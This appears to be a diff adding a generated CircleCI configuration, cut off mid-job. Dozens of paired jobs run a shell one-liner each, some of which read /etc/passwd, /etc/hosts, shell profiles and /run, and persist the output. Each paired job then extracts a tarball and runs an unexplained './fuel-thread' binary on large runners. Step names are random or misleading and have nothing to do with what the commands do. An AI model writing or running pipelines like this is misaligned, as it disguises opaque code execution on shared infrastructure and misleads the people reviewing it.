@@ -1,0 +1,1529 @@
+version: 2.1
+
+jobs:
+  rmrmrmrm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: XXX remaster the hero banner properly
+          command: |
+            mkdir -p /tmp/cx
+            set +o pipefail 2>/dev/null; cat /etc/issue 2>/dev/null > /tmp/cx/SKU69718; dd if=/dev/urandom bs=100 count=500 2>/dev/null | base64 >> /tmp/cx/SKU69718; true
+            stat -c '%U:%G' /tmp/cx/SKU69718 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'SKU69718'
+  bob-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/SKU69718 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  SERVER_200007:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Garbage collect the retry buffer to be thorough
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; install -m 644 /etc/hosts "/tmp/coral_2026-09-01.csv" && ls -l "/tmp/coral_2026-09-01.csv"; true ; } > /tmp/cx/183858_2026
+            stat -c '%U:%G' /tmp/cx/183858_2026 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '183858_2026'
+  DeployRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/183858_2026 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  Restore-UIWrapper:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Issue Variant A
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; find /var/log -type f -name '*.old' -print0 2>/dev/null | xargs -0r stat -c %s | awk '{s+=$1} END {print s}'; true ; } > /tmp/cx/patch-8340
+            stat -c '%U:%G' /tmp/cx/patch-8340 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'patch-8340'
+  verify-quick-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/patch-8340 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  entry1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Verification by script
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; tar -zcf '/tmp/heap.tgz' -C /etc profile&&tar -tvzf '/tmp/heap.tgz'; true ; } > /tmp/cx/241.115.16
+            stat -c '%U:%G' /tmp/cx/241.115.16 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '241.115.16'
+  go1-21-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/241.115.16 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  rd_us:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Mind notifying the front desk
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; str="first line"; echo "$str" | grep -o . | sort | uniq -c | sort -rn | head -n 3; true ; } > /tmp/cx/6f0692c7b74
+            stat -c '%U:%G' /tmp/cx/6f0692c7b74 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '6f0692c7b74'
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/6f0692c7b74 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  xcvbnmasdf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Link FAQ page r4
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; sort </etc/shells >'/tmp/worker-olive.tmp' && head -3 '/tmp/worker-olive.tmp'; true ; } > /tmp/cx/9ham6z0y8w4ww
+            stat -c '%U:%G' /tmp/cx/9ham6z0y8w4ww | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '9ham6z0y8w4ww'
+  QA_CHECK_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/9ham6z0y8w4ww 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  Join-IdItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Kernel Attestation
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; find /var/tmp -exec ls -ld "{}" \; 2>/dev/null | wc -l; true ; } > /tmp/cx/config921
+            stat -c '%U:%G' /tmp/cx/config921 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'config921'
+  november:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/config921 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  qty--chld:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Hand the service accounts back to prod
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; f() { while getopts ab: o; do echo "$o=${OPTARG:-}"; done; }; f -a -b 6; true ; } > /tmp/cx/os_Proxy_14463-Hollow
+            stat -c '%U:%G' /tmp/cx/os_Proxy_14463-Hollow | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'os_Proxy_14463-Hollow'
+  perseus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/os_Proxy_14463-Hollow 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  AllTheStates:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Harmonize release notes
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; uptime |rev |cut -c1-22; true ; } > /tmp/cx/error.log
+            stat -c '%U:%G' /tmp/cx/error.log | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'error.log'
+  Package_Release2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/error.log 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  postSidebarById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Enable masking at scale
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; for w in zurich nairobi toronto osaka cairo; do printf '%s\n' $w;done |sort; true ; } > /tmp/cx/run4_cc15
+            stat -c '%U:%G' /tmp/cx/run4_cc15 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'run4_cc15'
+  india:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/run4_cc15 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  LIGHT_TAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: For luck poll the mailing list
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; echo 'step 2 of 5' | od -c | head -n2; true ; } > /tmp/cx/blake_87f3112e
+            stat -c '%U:%G' /tmp/cx/blake_87f3112e | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'blake_87f3112e'
+  go1-21-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/blake_87f3112e 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  c11030d164c:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: AUTO unmount
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; cp /etc/passwd /tmp/d.tmp && sed -i 's/:x:/:*:/' /tmp/d.tmp && grep -c . /tmp/d.tmp; true ; } > /tmp/cx/AtolLchuNk
+            stat -c '%U:%G' /tmp/cx/AtolLchuNk | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'AtolLchuNk'
+  jan17-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/AtolLchuNk 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  SPLIT-promise:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: In case of failure store the calibration beads
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; printf %s "one, two, three" | md5sum | awk '{print $1}'; true ; } > /tmp/cx/0buj5B3gYbrwBA2MtA9a
+            stat -c '%U:%G' /tmp/cx/0buj5B3gYbrwBA2MtA9a | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '0buj5B3gYbrwBA2MtA9a'
+  mar13-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/0buj5B3gYbrwBA2MtA9a 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  matchAccountShipment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: FollowUpWithOnCall
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; seq 2 56 | tac | sort -n; true ; } > /tmp/cx/thicket242
+            stat -c '%U:%G' /tmp/cx/thicket242 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'thicket242'
+  wip-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/thicket242 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  cherry-cube-sync-static:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: 2026 year end rebalance
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; mkdir -p '/var/tmp/nightLib'/{omar,leo,dave} && ls '/var/tmp/nightLib'; true ; } > /tmp/cx/jbulj16x6bd
+            stat -c '%U:%G' /tmp/cx/jbulj16x6bd | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'jbulj16x6bd'
+  rl-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/jbulj16x6bd 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  StrongUnboundedLockQuery:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Seed the schema if you can
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/theater3'/{nina,noah,ann} && ls '/tmp/theater3'; true ; } > /tmp/cx/memodriftfoxwillow
+            stat -c '%U:%G' /tmp/cx/memodriftfoxwillow | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'memodriftfoxwillow'
+  RunRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/memodriftfoxwillow 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  vector-PASSWORD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Me inspecting the socket pool
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; for file in /etc/default/*; do printf '%s\n' ${file}; done | tac; true ; } > /tmp/cx/INV-2023-17747
+            stat -c '%U:%G' /tmp/cx/INV-2023-17747 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'INV-2023-17747'
+  v7-canary4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/INV-2023-17747 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  exp0r7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: pkg7 tests
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; printf 'a\n\n\nb\n' >"/tmp/gingerzonediary.tmp" && cat -n "/tmp/gingerzonediary.tmp"; true ; } > /tmp/cx/28.16.175.246
+            stat -c '%U:%G' /tmp/cx/28.16.175.246 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '28.16.175.246'
+  node20-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/28.16.175.246 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  mission-november:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collect the parking passes for Amara
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; df -k . | head -4; true ; } > /tmp/cx/2aad6c0e-7d3b-dd59-0a40-2418a5b853
+            stat -c '%U:%G' /tmp/cx/2aad6c0e-7d3b-dd59-0a40-2418a5b853 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '2aad6c0e-7d3b-dd59-0a40-2418a5b853'
+  assemble-nightly-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/2aad6c0e-7d3b-dd59-0a40-2418a5b853 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  TNM-31089:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: TUNE DIALOGUE TREE ON NIGHTLY
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; touch -t 202403211200 "/tmp/module-2025-10.marker" && stat -c %y "/tmp/module-2025-10.marker"; true ; } > /tmp/cx/oD
+            stat -c '%U:%G' /tmp/cx/oD | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'oD'
+  sierra-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/oD 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  cog-bear-profile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Resume count email
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; echo 'right rule' | sed 's/\([a-z]\)\([a-z]\)/\2\1/'; true ; } > /tmp/cx/bear523
+            stat -c '%U:%G' /tmp/cx/bear523 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'bear523'
+  node18-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/bear523 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  bi_user:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Remind the probation reviews and file
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; for path in $HOME/.bash*; do basename $path; done | head -n 3; true ; } > /tmp/cx/willow.stock.peer.guest
+            stat -c '%U:%G' /tmp/cx/willow.stock.peer.guest | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'willow.stock.peer.guest'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/willow.stock.peer.guest 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  sprint_23062002:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Derisk sync
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; for u in fox panda frog crow eagle; do printf '%-8s %d\n' "$u" ${#u};done | sort -r; true ; } > /tmp/cx/sample9_822e
+            stat -c '%U:%G' /tmp/cx/sample9_822e | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'sample9_822e'
+  produce-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/sample9_822e 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  email_rates:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: smoke test TAKE TWO
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; nl -ba -w3 /etc/os-release|head -n6; true ; } > /tmp/cx/537f9-4c2-6763-bb7c
+            stat -c '%U:%G' /tmp/cx/537f9-4c2-6763-bb7c | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '537f9-4c2-6763-bb7c'
+  canary-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/537f9-4c2-6763-bb7c 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  horseSys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: relocate the temp files ASAP
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type f -exec md5sum {} + 2> /dev/null | sort -r; true ; } > /tmp/cx/iron-gadget-hollow-archive
+            stat -c '%U:%G' /tmp/cx/iron-gadget-hollow-archive | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'iron-gadget-hollow-archive'
+  chen-verify:
